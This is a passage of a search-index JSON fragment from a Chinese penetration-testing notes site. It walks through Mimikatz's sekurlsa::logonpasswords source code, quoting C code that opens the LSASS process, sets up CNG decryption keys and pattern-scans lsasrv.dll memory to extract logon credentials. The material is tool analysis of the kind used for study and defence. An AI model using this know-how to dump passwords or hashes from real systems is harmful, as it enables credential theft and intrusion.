\u8fd4\u56de\u503c\u5927\u4e8e\u7b49\u4e8e0\u4ee3\u8868\u6210\u529f\u83b7\u5f97\u6743\u9650\uff0c\u5c0f\u4e8e0\u4ee3\u8868\u83b7\u53d6\u6743\u9650\u5931\u8d25\u3002","title":"\u4ece\u8f93\u5165\u547d\u4ee4\u5230privilege::debug"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#mimikatz_1","text":"","title":"mimikatz\u4e2d\u51fa\u73b0\u8fc7\u7684\u7279\u6b8a\u8bed\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#longlong_ptrtype-0-field","text":"\u8fd9\u91cc\u7684type\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0cfield\u662f\u7ed3\u6784\u4f53\u4e2d\u7684\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\uff0c\u901a\u8fc7\u8fd9\u4e2a\u8bed\u53e5\u53ef\u4ee5\u5f97\u77e5field\u7684\u5728\u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb\u91cf \u201cANSI C\u6807\u51c6\u5141\u8bb8\u503c\u4e3a0\u7684\u5e38\u91cf\u88ab\u5f3a\u5236\u8f6c\u6362\u6210\u4efb\u4f55\u4e00\u79cd\u7c7b\u578b\u7684\u6307\u9488\uff0c \u5e76\u4e14\u8f6c\u6362\u7ed3\u679c\u662f\u4e00\u4e2aNULL\u6307\u9488\uff0c\u56e0\u6b64((type *)0)\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3atype *\u7684NULL\u6307\u9488\u3002 \u5982\u679c\u5229\u7528\u8fd9\u4e2aNULL\u6307\u9488\u6765\u8bbf\u95eetype\u7684\u6210\u5458\u5f53\u7136\u662f\u975e\u6cd5\u7684\uff0c \u4f46&( ((type *)0)->field )\u7684\u610f\u56fe\u4ec5\u4ec5\u662f\u8ba1\u7b97field\u5b57\u6bb5\u7684\u5730\u5740\u3002 \u806a\u660e\u7684\u7f16\u8bd1\u5668\u6839\u672c\u5c31\u4e0d\u751f\u6210\u8bbf\u95eetype\u7684\u4ee3\u7801\uff0c \u800c\u4ec5\u4ec5\u662f\u6839\u636etype\u7684\u5185\u5b58\u5e03\u5c40\u548c\u7ed3\u6784\u4f53\u5b9e\u4f8b\u9996\u5740\u5728\u7f16\u8bd1\u671f\u8ba1\u7b97\u8fd9\u4e2a\uff08\u5e38\u91cf\uff09\u5730\u5740\uff0c \u8fd9\u6837\u5c31\u5b8c\u5168\u907f\u514d\u4e86\u901a\u8fc7NULL\u6307\u9488\u8bbf\u95ee\u5185\u5b58\u7684\u95ee\u9898\u3002 \u53c8\u56e0\u4e3a\u9996\u5740\u4e3a0\uff0c\u6240\u4ee5\u8fd9\u4e2a\u5730\u5740\u7684\u503c\u5c31\u662f\u5b57\u6bb5\u76f8\u5bf9\u4e8e\u7ed3\u6784\u4f53\u57fa\u5740\u7684\u504f\u79fb\u3002 \u4ee5\u4e0a\u65b9\u6cd5\u907f\u514d\u4e86\u5b9e\u4f8b\u5316\u4e00\u4e2atype\u5bf9\u8c61\uff0c\u5e76\u4e14\u6c42\u503c\u5728\u7f16\u8bd1\u671f\u8fdb\u884c\uff0c\u6ca1\u6709\u8fd0\u884c\u671f\u8d1f\u62c5\u201d","title":"((LONG)(LONG_PTR)&amp;(((type *)0)-&gt;field))"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#mimikatzapi","text":"","title":"mimikatz\u5e38\u89c1API"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kull_m_memory_copy","text":"BOOL kull_m_memory_copy(OUT PKULL_M_MEMORY_ADDRESS Destination, IN PKULL_M_MEMORY_ADDRESS Source, IN SIZE_T Length) \u6839\u636eDestination\u548cSource\u7684type\uff0c\u91c7\u53d6\u4e0d\u540c\u7684\u884c\u52a8\uff0c\u5927\u81f4\u4e0a\u662f\u628aSource\u4e2d\u7684\u67d0\u503c\u653e\u5165Destination\u67d0\u5904\u3002 \u6bd4\u8f83\u5e38\u89c1\u7684type\u7ec4\u5408\u4e3aDestination\u4e3aKULL_M_MEMORY_TYPE_OWN\uff0cSource\u4e3aKULL_M_MEMORY_TYPE_PROCESS\u3002 \u8fd9\u6837\u5c31\u4f1a\u628aSource->hMemory->pHandleProcess->hProcess \uff08\u6307\u5b9a\u7684\u67d0\u8fdb\u7a0b\u53e5\u67c4\uff09\u504f\u79fbSource->address\uff08\u8fdb\u7a0b\u4e2d\u7684\u504f\u79fb\u91cf\uff09\u5904\u83b7\u5f97\u7684\u5730\u5740\u653e\u5165Destination->address \uff0c\u4f8b\u5982\u5c06lsass\u8fdb\u7a0b\u53e5\u67c4\u504f\u79fb\u5230PEB\u540e\u7684\u5185\u5bb9\u653e\u5165Destination.address\u6307\u9488\u6240\u6307\u533a\u57df","title":"kull_m_memory_copy"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#rekurlsa","text":"","title":"rekurlsa"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#logonpasswords","text":"rekurlas::logonpasswords,mimikatz\u6700\u5e38\u7528\u5230\u7684\u547d\u4ee4\u4e4b\u4e00\uff0c\u7528\u4e8e\u4eceLSA\u4e2ddump\u51fa\u660e\u6587\u5bc6\u7801\u6216\u8005hash\u3002 \u4f46\u662f\u5728\u5b89\u88c5\u4e86KB2871997\u8865\u4e01\u6216\u8005\u7cfb\u7edf\u7248\u672c\u5927\u4e8ewindows server 2012\u65f6\uff0c\u7cfb\u7edf\u7684\u5185\u5b58\u4e2d\u5c31\u4e0d\u518d\u4fdd\u5b58\u660e\u6587\u7684\u5bc6\u7801\uff0c\u8fd9\u6837\u5229\u7528mimikatz\u5c31\u4e0d\u80fd\u4ece\u5185\u5b58\u4e2d\u8bfb\u51fa\u660e\u6587\u5bc6\u7801\u4e86\u3002 pCommand\u6267\u884c\u4e86\u5982\u4e0b\u7684\u547d\u4ee4 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[]) { return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages)); } lsassPackages \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8bb0\u5f55\u4e86\u5b89\u5168\u76f8\u5173\u6a21\u5757\u7684\u4e00\u4e9b\u4fe1\u606f \u7ee7\u7eed\u5f80\u4e0b\u8ddf\u8fdb NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages) { KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages}; return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData); } \u53ef\u4ee5\u53d1\u73b0kuhl_m_sekurlsa_enum \u4f7f\u7528\u4e86\u56de\u8c03\u51fd\u6570kuhl_m_sekurlsa_enum_callback_logondata\uff0c\u5173\u4e8e\u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u770b\u770b\u83dc\u9e1f\u6559\u7a0b\u7684\u89e3\u91ca https://www.runoob.com/w3cnote/c-callback-function.html\u3002\u8ddf\u8fdbkuhl_m_sekurlsa_enum\uff0c\u8fd9\u4e2a\u51fd\u6570\u5f88\u957f\uff0c\u5206\u5f00\u6765\u770b\u3002","title":"logonpasswords"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kuhl_m_sekurlsa_acquirelsa","text":"KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData; ULONG nbListes = 1, i; PVOID pStruct; KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}; BOOL retCallback = TRUE; const KUHL_M_SEKURLSA_ENUM_HELPER * helper; NTSTATUS status = kuhl_m_sekurlsa_acquireLSA(); //input information about lsass to cLsass \u524d\u9762\u4e00\u5806\u662f\u521d\u59cb\u5316\u4e00\u4e9b\u53d8\u91cf\uff0c\u7136\u540e\u8c03\u7528kuhl_m_sekurlsa_acquireLSA,\u8fd9\u4e2a\u51fd\u6570\u5927\u4f53\u662f\u5c06lsass\u7684\u4e00\u4e9b\u4fe1\u606f\u653e\u5165cLsass\u53d8\u91cf\uff0ccLsass\u53d8\u91cf\u662fsekurlsa\u6a21\u5757\u6587\u4ef6\uff08 KUHL_M_SEKURLSA.c)\u4e2d\u7684\u4e00\u4e2a\u7ed3\u6784\u4f53\u53d8\u91cf\u3002 KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}}; cLsass\u521a\u521d\u59cb\u5316\u65f6 \u6211\u4eec\u8ddf\u8fdbkuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5\uff0c\u770b\u5b83\u5177\u4f53\u662f\u505a\u4e86\u4ec0\u4e48\u3002","title":"\u521d\u59cb\u5316\u5404\u79cd\u53d8\u91cf\uff0c\u5e76\u8c03\u7528kuhl_m_sekurlsa_acquireLSA\u65b9\u6cd5"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kuhl_m_sekurlsa_acquirelsa-lsass","text":"\u8fdb\u53bb\u4ee5\u540e\u5148\u5b9a\u4e49\u4e00\u5927\u5806\u53d8\u91cf NTSTATUS status = STATUS_SUCCESS; KULL_M_MEMORY_TYPE Type; HANDLE hData = NULL; DWORD pid, cbSk; PMINIDUMP_SYSTEM_INFO pInfos; DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION); BOOL isError = FALSE; PBYTE pSk; \u7d27\u968f\u5176\u540e\u7684\u662f\u4e00\u5927\u5757\u5d4c\u5957if\u3002\u7b2c\u4e00\u5c42if\u4fbf\u662f\u5224\u65adcLsass\u4e2dhLsassMem\u662f\u5426\u4e3afalse\u503c\uff0c\u5f88\u663e\u7136\u662f\u7684\uff08\u521d\u59cb\u5316\u5b9a\u4e49\u7684\u65f6\u5019\u5c31\u662fnull\uff0ccLsass\u5728\u521d\u59cb\u5316\u540e\u8fd8\u6ca1\u6709\u4efb\u4f55\u53d8\u52a8\u3002) \u7136\u540e\u5728\u7b2c\u4e8c\u5c42if\u91cc\u5224\u65adpMinidumpName\u7684\u771f\u503c(Minidump\u4e5f\u662f\u4e00\u4e2aCommand\uff0c\u7528\u4e8e\u79bb\u7ebf\u63d0\u53d6hash\uff09\uff0c\u8fd9\u4e2a\u5c5e\u6027\u548ccLsass\u4e00\u6837\u4e5f\u662f\u5b58\u5728\u4e8e\u6a21\u5757\u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\u4e14\u9ed8\u8ba4\u4e3aFALSE\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528kull_m_process_getProcessIdForName\u51fd\u6570\uff08\u8fd9\u4e2a\u5c31\u5148\u4e0d\u7ec6\u8ddf\u4e86\uff09\u53bb\u83b7\u53d6lsass\u8fdb\u7a0b\u7684\u8fdb\u7a0bpid\u5e76\u901a\u8fc7OpenProcess\u83b7\u53d6\u5176\u8fdb\u7a0b\u53e5\u67c4 if(!cLsass.hLsassMem) { status = STATUS_NOT_FOUND; if(pMinidumpName) { Type = KULL_M_MEMORY_TYPE_PROCESS_DMP; kprintf(L\"Opening : \\'%s\\' file for minidump...\\n\", pMinidumpName); hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); } else { Type = KULL_M_MEMORY_TYPE_PROCESS; if(kull_m_process_getProcessIdForName(L\"lsass.exe\", &pid)) //\u83b7\u53d6lsass.exe\u7684pid hData = OpenProcess(processRights, FALSE, pid); //\u83b7\u53d6lsass.exe\u7684\u8fdb\u7a0b\u53e5\u67c4 else PRINT_ERROR(L\"LSASS process not found (?)\\n\"); }","title":"kuhl_m_sekurlsa_acquireLSA \u521d\u59cb\u5316\u53d8\u91cf\u5e76\u83b7\u53d6LSASS\u8fdb\u7a0b\u53e5\u67c4"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kuhl_m_sekurlsa_acquirelsa-clsass","text":"\u518d\u7136\u540e\u4fbf\u662f\u53e6\u5916\u4e00\u4e2a\u7b2c\u4e8c\u5c42\u7684\u5d4c\u5957if\u5224\u65ad\u903b\u8f91\uff0c\u5f88\u591a\uff0c\u4f46\u903b\u8f91\u4e0d\u96be\u3002 \u7b2c\u4e8c\u5c42lf\u5224\u65ad\u4e86OpenProcess\u83b7\u53d6lsass.exe\u8fdb\u7a0b\u53e5\u67c4\u662f\u5426\u6210\u529f \u7b2c\u4e09\u5c42if\u8c03\u7528kull_m_memory_open\u5e76\u5224\u65ad\u5176\u8fd4\u56de\u503c\u771f\u503c\uff0c\u8fd9\u4e2a\u51fd\u6570\u6839\u636e\u4f20\u5165\u7684Type\u7684\u503c\u6765\u91c7\u53d6\u4e0d\u540c\u884c\u52a8\uff0c\u4f46\u5927\u81f4\u90fd\u662f\u5c06\u53e5\u67c4\u585e\u8fdb\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u7684\u7ed3\u6784\u4f53\u7684\u67d0\u5904 \u7b2c\u56db\u5c42if\u5224\u65adType\u503c\u662f\u5426\u4e3aKULL_M_MEMORY_TYPE_PROCESS_DMP\uff0c\u5f88\u663e\u7136\u4e0d\u662f\u7684\uff0csekurlsa::logonpasswords\u5230\u8fd9\u91cc\u4e0d\u4f1a\u8fdb\u4e00\u6b65\u8ddf\u8fdb\u4e86 \u5728windows\u4e2d\u4f1a\u76f4\u63a5\u8fdb\u5165\u5230\u7ed9cLsass\u8d4b\u503c\uff0c\u5c06\u7248\u672c\u4fe1\u606f\u7b49\u8d4b\u503c\u5230cLsass\u7ed3\u6784\u4f53\u4e2d","title":"kuhl_m_sekurlsa_acquireLSA \u5411cLsass\u5199\u5165\u7248\u672c\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kuhl_m_sekurlsa_acquirelsa-cng","text":"\u8fc7\u540e\u8fd8\u6709\u4e00\u4e2a\u7b2c\u56db\u5c42If\u5224\u65ad\uff0c\u5b83\u5224\u65adisError\u8fd9\u4e2a\u53d8\u91cf\u7684\u771f\u503c\u3002\u8fd9\u4e2a\u53d8\u91cf\u521d\u59cb\u5b9a\u4e49\u4e3afalse\uff0c\u6240\u4ee5\u4ee3\u7801\u4f1a\u8ddf\u8fdb\u8fd9\u4e2aif\uff0c\u8fd9\u4e00\u5c42\u4e3b\u8981\u662f\u7ed9lsassLocalHelper\u53d8\u91cf\u8d4b\u503c\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4f1a\u56e0\u4e3awindows\u7248\u672c\u4e0d\u540c\u800c\u4e0d\u540c\uff0c\u4e3b\u8981\u7528\u4e8e\u8bb0\u5f55lsass\u8fdb\u7a0b\u7684\u4e00\u4e9b\u8f85\u52a9\u4fe1\u606f \u968f\u540e\u5728\u63a5\u4e0b\u6765\u7684\u7b2c\u4e94\u5c42if\u91cc\u4f1a\u8c03\u7528lsassLocalHelper\u7ed3\u6784\u4f53\u4e2d\u7684initLocalLib\u65b9\u6cd5\u5e76\u901a\u8fc7\u4e00\u4e2a\u5b8f\u5224\u65ad\u5176\u8fd4\u56de\u503c (#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)) if(!isError) { lsassLocalHelper = #if defined(_M_ARM64) &lsassLocalHelpers[0] #else (cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1] #endif ; if(NT_SUCCESS(lsassLocalHelper->initLocalLib())) { //code } NTSTATUS kuhl_m_sekurlsa_nt6_init() { if(!NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit)) kuhl_m_sekurlsa_nt6_KeyInit = kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory(); return kuhl_m_sekurlsa_nt6_KeyInit; } NTSTATUS kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory() { NTSTATUS status = STATUS_NOT_FOUND; ULONG dwSizeNeeded; __try { status = BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0); if(NT_SUCCESS(status)) { status = BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0); if(NT_SUCCESS(status)) { status = BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0); if(NT_SUCCESS(status)) k3Des.pKey = (PBYTE) LocalAlloc(LPTR, k3Des.cbKey); } } if(NT_SUCCESS(status)) { status = BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0); if(NT_SUCCESS(status)) { status = BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0); if(NT_SUCCESS(status)) { status = BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0); if(NT_SUCCESS(status)) kAes.pKey = (PBYTE) LocalAlloc(LPTR, kAes.cbKey); } } } } __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){} return status; } \u4ee5\u4e0b\u662fCNG API\uff1a \u6253\u5f00\u7b97\u6cd5\u63d0\u4f9b\u8005\uff1a BCryptOpenAlgorithmProvider \u5bfc\u5165\u5bc6\u94a5\uff1a BCryptGenerateSymmetricKey \u521b\u5efa\u5bc6\u94a5\uff1a BCryptCreateHash BCryptHashData BCryptFinishHash BCryptGenerateSymmetricKey \u83b7\u53d6\u6216\u8bbe\u7f6e\u7b97\u6cd5\u5c5e\u6027\uff1a BCryptGetProperty BCryptSetProperty \u6267\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff1a BCryptEncrypt BCryptDecrypt \u679a\u4e3e\u63d0\u4f9b\u8005\uff1a BCryptEnumRegisteredProviders \u5173\u95ed\u7b97\u6cd5\u63d0\u4f9b\u8005\uff1a BCryptCloseAlgorithmProvider \u9500\u6bc1\u5bc6\u94a5\uff1a BCryptDestroyKey \u9500\u6bc1\u54c8\u5e0c\uff1a BCryptDestroyHash \u53ef\u4ee5\u5728\u521a\u521a\u7684\u4ee3\u7801\u91cc\u770b\u89c1BCryptOpenAlgorithmProvider\u8fd9\u79cdAPI\uff0c\u8fd9\u79cdAPI\u7528\u4e8e\u5bc6\u94a5\u7684\u751f\u6210\u3002 NTSTATUS BCryptOpenAlgorithmProvider( BCRYPT_ALG_HANDLE *phAlgorithm, //\u63a5\u6536CNG \u53e5\u67c4 LPCWSTR pszAlgId, //\u52a0\u5bc6\u6a21\u5f0f LPCWSTR pszImplementation, //\u9009\u5b9aprovider\uff0c\u5982\u679c\u4e3aNULL\u5219\u9009\u7528\u52a0\u5bc6\u6a21\u5f0f\u5bf9\u5e94\u7684\u9ed8\u8ba4provider ULONG dwFlags //\u5b9a\u4e49\u51fd\u6570\u5177\u4f53\u884c\u4e3a ); https://docs.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider NTSTATUS BCryptSetProperty( BCRYPT_HANDLE hObject, //CNG\u53e5\u67c4 LPCWSTR pszProperty, //\u9700\u8981\u88ab\u8bbe\u7f6e\u7684\u5c5e\u6027\u540d PUCHAR pbInput, //\u5b58\u50a8\u65b0\u5c5e\u6027\u503c\u7684\u7f13\u51b2\u533a\u5730\u5740 ULONG cbInput, //\u7f13\u51b2\u533a\u5927\u5c0f ULONG dwFlags //\u4e00\u76f4\u4e3a0 ); NTSTATUS BCryptGetProperty( BCRYPT_HANDLE hObject, //CNG\u53e5\u67c4 LPCWSTR pszProperty, //\u9700\u8981\u88ab\u63a5\u53d7\u7684\u5c5e\u6027\u540d PUCHAR pbOutput, //\u63a5\u6536\u5c5e\u6027\u503c\u7684\u7f13\u51b2\u533a\u5730\u5740 ULONG cbOutput, //\u7f13\u51b2\u533a\u5927\u5c0f ULONG *pcbResult, //\u4e00\u4e2a\u7528\u6765\u63a5\u6536\u88ab\u590d\u5236\u5230\u7f13\u51b2\u533a\u7684\u5b57\u8282\u6570\u91cf\u7684\u53d8\u91cf ULONG dwFlags //\u4e00\u76f4\u4e3a0 );","title":"kuhl_m_sekurlsa_acquireLSA \u751f\u6210CNG\u53e5\u67c4"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#kuhl_m_sekurlsa_acquirelsa_1","text":"\u5728if\u6761\u4ef6\u4e2d\u751f\u6210CNG \u53e5\u67c4\u540e\uff0c\u5230\u8fd9\u91cc\u5c31\u63a5\u8fd1sekurlsa::logonpasswords\u7684\u6838\u5fc3\u90e8\u5206\u4e86 \u8fdb\u5165\u5230\u6b64IF\u4e2d\u4e00\u5f00\u59cb\u4f1a\u6839\u636ewindows\u7248\u672c\u6765\u5224\u65ad\u4e00\u4e9bwindows\u8ba4\u8bc1\u529f\u80fd\u662f\u5426\u53ef\u7528\uff08livessp,tspkg,cloudap) if(NT_SUCCESS(lsassLocalHelper->initLocalLib())) { #if !defined(_M_ARM64) kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8); #endif kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2); kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909); if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent) //\u83b7\u53d6lsass\u4e2d\u76f8\u5173DLL\u7684\u4fe1\u606f\uff0c\u82e5\u67d0dll\u5b58\u5728\u5219\u5728lsasspackages\u53d8\u91cf\u4e2d\u5c06\u5176\u6807\u8bb0 { kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module; if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module)) //\u901a\u8fc7LsaSrv.dll\u83b7\u53d6\u767b\u5f55\u4f1a\u8bdd(lsasrv.dll\u662f\u4e00\u4e2a\u7528\u4e8ewinnt\u64cd\u4f5c\u7cfb\u7edf\u7684\u672c\u5730\u5b89\u5168\u5bc6\u7801\u9a8c\u8bc1\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6) { status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations); //\u63d0\u53d6\u7528\u6237\u5bc6\u7801\u7684\u5bc6\u94a5 if(!NT_SUCCESS(status)) PRINT_ERROR(L\"Key import\\n\"); } else PRINT_ERROR(L\"Logon list\\n\"); } else PRINT_ERROR(L\"Modules informations\\n\"); }","title":"kuhl_m_sekurlsa_acquireLSA \u6838\u5fc3\u90e8\u5206"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#lsassldrdll","text":"\u7136\u540e\u4fbf\u662f\u901a\u8fc7kull_m_process_getVeryBasicModuleInformations\u65b9\u6cd5\u6765\u83b7\u53d6lsass\u4e2d\u76f8\u5173DLL\u7684\u4fe1\u606f\uff0c\u82e5\u67d0dll\u5b58\u5728\u5219\u5728lsasspackages\u53d8\u91cf\u4e2d\u5c06\u5176\u6807\u8bb0 \u5982\u4e0b\u56fe\uff0cisPresent\u4e3a1\u5219\u6807\u8bc6\u8be5dll\u5b58\u5728","title":"\u626b\u63cflsass\u8fdb\u7a0bLDR\u94fe\u83b7\u53d6DLL\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/Mimikatz%E5%88%86%E6%9E%90/Mimikatz%E5%88%86%E6%9E%90/#lsasrvdll","text":"\u5411\u4e0b\uff0c\u901a\u8fc7kuhl_m_sekurlsa_utils_search\u6765\u901a\u8fc7LsaSrv.dll\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u3002\u5177\u4f53\u662f\u901a\u8fc7\u5b57\u7b26\u4e32\u5339\u914ddll\u4e2d\u7684\u4fe1\u606f\u6765\u8fbe\u5230\u83b7\u53d6\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u7684\u76ee\u7684 \u6211\u4eec\u8ddf\u8fdb\u5b83\uff0c\u8ddf\u4e0b\u53bb\uff0c\u4f1a\u6765\u5230\u6b64\u5904 currentReference\u662f\u6839\u636e\u7248\u672c\u786e\u5b9a\u7684lsasrv\u8be6\u7ec6\u4fe1\u606f\uff0c\u88ab\u5b9a\u4e49\u5728\u5982\u4e0b\u7ed3\u6784\u4f53\uff0c\u4e3a\u5982\u4e0b\u7ed3\u6784\u4f53\u4e2d\u7684\u4e00\u9879 \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0bkull_m_memory_search\u4e2d\u5404\u53c2\u6570\u610f\u4e49\uff1a aLocalMemory.address \u8868\u793alsasrv.dll\u7684\u4e00\u4e2a\u5730\u5740\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570currentReference->Search.Length\u6bd4\u8f83\u7b80\u5355\uff0c\u5c31\u662f\u7528\u4e8e\u6307\u5b9a\u641c\u7d22\u957f\u5ea6 sMemory\u6bd4\u8f83\u91cd\u8981, KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL}; address\u8bb0\u5f55lsasrv.dll\u5728lsass\u8fdb\u7a0b\u4e2d\u7684\u504f\u79fb\u91cf\uff08\u5728kuhl_m_sekurlsa_msv_package.Module\u4e2d\u5b9a\u4e49\u7684\uff09\uff0chMemory\u8bb0\u5f55lsass\u53e5\u67c4\u7684\u76f8\u5173\u4fe1\u606f \u6211\u4eec\u8ddf\u8fdb\u65b9\u6cd5kull_m_memory_search BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst) \u4f1a\u6765\u5230\u6b64\u5904\u3002 \u6211\u4eec\u53d1\u73b0\u518d\u4e00\u6b21\u8c03\u7528\u4e86kull_m_memory_search,\u8ddf\u8fdb\u4f1a\u6765\u5230\u8fd9\u91cc\u3002\u8fd9\u91cc\u7684\u4f5c\u7528\u4fbf\u662f\u4ecelsass\u8fdb\u7a0blsasrv.dll\u5185\u5b58\u5185\u5bb9\u7684\u5f00\u59cb\u4e00\u76f4\u5faa\u73af\u67e5\u8be2\uff0c\u76f4\u5230\u5728lsasrv.dll\u5185\u5b58\u5185\u5bb9\u4e2d\u67e5\u8be2\u5230\u4e0ecurrentReference->Search.Pattern \u8868\u793a\u7684\u5730\u5740\u5185\u5bb9\u4e00\u81f4\u7684 \u5730\u5740 BOOL WINAPI RtlEqualMemory( void* Destination, void* Source, size_t Length ); The RtlEqualMemory routine compares two blocks of memory to determine whether the specified number of bytes are identical. \u7136\u540e\u4fbf\u662f\u628aCurrentPtr\u7684\u4fe1\u606f\u653e\u5165sBuffer.result \uff0c\u7b2c\u4e8c\u5c42kull_m_memory_search\u7ed3\u675f 